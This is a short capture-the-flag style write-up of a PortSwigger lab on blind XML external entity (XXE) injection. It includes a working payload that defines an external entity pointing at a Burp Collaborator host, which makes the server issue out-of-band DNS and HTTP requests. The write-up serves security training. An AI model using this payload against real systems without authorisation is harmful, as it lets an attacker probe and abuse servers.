---
author: Nithissh S
pubDatetime: 2024-11-23T15:22:00Z
modDatetime: 2024-11-23T09:12:47.400Z
title: Blind XXE with out-of-band interaction
slug: xxe-portswigger-lab-5
featured: false
draft: false
tags:
  - BSCP
  - XXE
description:
  This lab has a "Check stock" feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
---

## Objective 

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

## Solution 

Just like the previous XXE labs, we have a functionality to check for stocks on the particular products 

![](../../assets/images/bscp/xxe/xxe-15.png)

But this lab is little bit different from the others where in the last few labs, where we did pass the payload and based on error response.. we will look into it to triage it

Now in this attack technique is little bit different, we can utilise a technique called `Out of Band` technique 

This type of XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

With the following payload, placed in the `POST` body request where it will trigger in pingback through collaborator

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]> 
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Once after request is successfully passed, we can see that I've recieved two different pingbacks one is `HTTP` and `DNS`

![](../../assets/images/bscp/xxe/xxe-16.png)

Since we recieved a pingback and that solves the lab 

![](../../assets/images/bscp/xxe/xxe-17.png)